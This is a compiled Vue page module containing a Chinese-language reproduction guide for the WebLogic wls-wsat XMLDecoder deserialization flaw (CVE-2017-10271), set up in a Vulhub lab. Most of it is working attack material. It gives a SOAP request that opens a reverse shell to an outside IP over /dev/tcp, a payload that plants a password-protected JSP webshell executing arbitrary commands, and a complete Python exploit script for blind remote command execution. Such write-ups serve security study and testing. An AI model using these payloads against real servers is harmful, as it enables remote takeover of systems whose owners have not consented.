import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o,c as l,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const r={},c=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。",-1),d=n("p",null,"参考链接：",-1),v={href:"https://www.exploit-db.com/exploits/43458/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://paper.seebug.org/487/",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic",target:"_blank",rel:"noopener noreferrer"},k={href:"http://xn--WLS-WebServices-vm6x249azia50os9do91f7n2boy0a1zj832h.md",target:"_blank",rel:"noopener noreferrer"},q={href:"http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html",target:"_blank",rel:"noopener noreferrer"},h=p(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待一段时间，访问<code>http://your-ip:7001/</code>即可看到一个404页面，说明weblogic已成功启动。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021642629.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
&lt;void index=&quot;0&quot;&gt;
&lt;string&gt;/bin/bash&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;/void&gt;
&lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.128/9999 0&amp;gt;&amp;amp;1&lt;/string&gt;
&lt;/void&gt;
&lt;/array&gt;
&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/java&gt;
&lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功获取shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021644422.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="webshell" tabindex="-1"><a class="header-anchor" href="#webshell" aria-hidden="true">#</a> webshell</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
    &lt;soapenv:Header&gt;
    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
    &lt;![CDATA[
    &lt;% if(&quot;poc&quot;.equals(request.getParameter(&quot;pwd&quot;))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
    int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;);
            while((a=in.read(b))!=-1){
                out.println(new String(b,0,a));
            }
            out.print(&quot;&lt;/pre&gt;&quot;);
        }
    %&gt;
    ]]&gt;
    &lt;/string&gt;
    &lt;/void&gt;
    &lt;void method=&quot;close&quot;/&gt;
    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
    &lt;/work:WorkContext&gt;
    &lt;/soapenv:Header&gt;
    &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>访问：<code>http://your-ip:7001/bea_wls_internal/test.jsp</code>，执行命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021657971.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">input</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

url_in <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
payload_url <span class="token operator">=</span> url_in <span class="token operator">+</span> <span class="token string">&quot;/wls-wsat/CoordinatorPortType&quot;</span>
payload_header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;content-type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/xml&#39;</span><span class="token punctuation">}</span>


<span class="token keyword">def</span> <span class="token function">payload_command</span> <span class="token punctuation">(</span>command_in<span class="token punctuation">)</span><span class="token punctuation">:</span>
    html_escape_table <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;&amp;amp;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;&quot;&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;&amp;quot;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;&#39;&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;&amp;apos;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;&gt;&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;&amp;gt;&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;&lt;&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;&amp;lt;&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    command_filtered <span class="token operator">=</span> <span class="token string">&quot;&lt;string&gt;&quot;</span><span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>html_escape_table<span class="token punctuation">.</span>get<span class="token punctuation">(</span>c<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> command_in<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&lt;/string&gt;&quot;</span>
    payload_1 <span class="token operator">=</span> <span class="token string">&quot;&lt;soapenv:Envelope xmlns:soapenv=\\&quot;http://schemas.xmlsoap.org/soap/envelope/\\&quot;&gt; \\n&quot;</span> \\
                <span class="token string">&quot;   &lt;soapenv:Header&gt; &quot;</span> \\
                <span class="token string">&quot;       &lt;work:WorkContext xmlns:work=\\&quot;http://bea.com/2004/06/soap/workarea/\\&quot;&gt; \\n&quot;</span> \\
                <span class="token string">&quot;           &lt;java version=\\&quot;1.8.0_151\\&quot; class=\\&quot;java.beans.XMLDecoder\\&quot;&gt; \\n&quot;</span> \\
                <span class="token string">&quot;               &lt;void class=\\&quot;java.lang.ProcessBuilder\\&quot;&gt; \\n&quot;</span> \\
                <span class="token string">&quot;                  &lt;array class=\\&quot;java.lang.String\\&quot; length=\\&quot;3\\&quot;&gt;&quot;</span> \\
                <span class="token string">&quot;                      &lt;void index = \\&quot;0\\&quot;&gt;                       &quot;</span> \\
                <span class="token string">&quot;                          &lt;string&gt;cmd&lt;/string&gt;                 &quot;</span> \\
                <span class="token string">&quot;                      &lt;/void&gt;                                    &quot;</span> \\
                <span class="token string">&quot;                      &lt;void index = \\&quot;1\\&quot;&gt;                       &quot;</span> \\
                <span class="token string">&quot;                          &lt;string&gt;/c&lt;/string&gt;                  &quot;</span> \\
                <span class="token string">&quot;                      &lt;/void&gt;                                    &quot;</span> \\
                <span class="token string">&quot;                      &lt;void index = \\&quot;2\\&quot;&gt;                       &quot;</span> \\
                <span class="token operator">+</span> command_filtered <span class="token operator">+</span> \\
                <span class="token string">&quot;                      &lt;/void&gt;                                    &quot;</span> \\
                <span class="token string">&quot;                  &lt;/array&gt;&quot;</span> \\
                <span class="token string">&quot;                  &lt;void method=\\&quot;start\\&quot;/&gt;&quot;</span> \\
                <span class="token string">&quot;                  &lt;/void&gt;&quot;</span> \\
                <span class="token string">&quot;            &lt;/java&gt;&quot;</span> \\
                <span class="token string">&quot;        &lt;/work:WorkContext&gt;&quot;</span> \\
                <span class="token string">&quot;   &lt;/soapenv:Header&gt;&quot;</span> \\
                <span class="token string">&quot;   &lt;soapenv:Body/&gt;&quot;</span> \\
                <span class="token string">&quot;&lt;/soapenv:Envelope&gt;&quot;</span>
    <span class="token keyword">return</span> payload_1

<span class="token keyword">def</span> <span class="token function">do_post</span><span class="token punctuation">(</span>command_in<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>payload_url<span class="token punctuation">,</span> payload_command<span class="token punctuation">(</span>command_in <span class="token punctuation">)</span><span class="token punctuation">,</span>headers <span class="token operator">=</span> payload_header<span class="token punctuation">)</span>

    <span class="token keyword">if</span> result<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Command Executed \\n&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Something Went Wrong \\n&quot;</span><span class="token punctuation">)</span>



<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;***************************************************** \\n&quot;</span> \\
       <span class="token string">&quot;****************   Coded By 1337g  ****************** \\n&quot;</span> \\
       <span class="token string">&quot;*  CVE-2017-10271 Blind Remote Command Execute EXP  * \\n&quot;</span> \\
       <span class="token string">&quot;***************************************************** \\n&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    command_in <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;Eneter your command here: &quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> command_in <span class="token operator">==</span> <span class="token string">&quot;exit&quot;</span> <span class="token punctuation">:</span> exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    do_post<span class="token punctuation">(</span>command_in<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17);function _(x,w){const a=i("ExternalLinkIcon");return o(),l("div",null,[c,u,d,n("ul",null,[n("li",null,[n("a",v,[s("https://www.exploit-db.com/exploits/43458/"),t(a)])]),n("li",null,[n("a",m,[s("https://paper.seebug.org/487/"),t(a)])]),n("li",null,[s("["),n("a",g,[s("https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic WLS-WebServices组件反序列化漏洞分析.md"),t(a)]),s("]("),n("a",b,[s("https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic"),t(a)]),s(),n("a",k,[s("WLS-WebServices组件反序列化漏洞分析.md"),t(a)]),s(")")]),n("li",null,[n("a",q,[s("http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html"),t(a)])])]),h])}const E=e(r,[["render",_],["__file","Weblogic  10.3.6 wls-wsat XMLDecoder 反序列化漏洞 CVE-2017-10271.html.vue"]]);export{E as default};
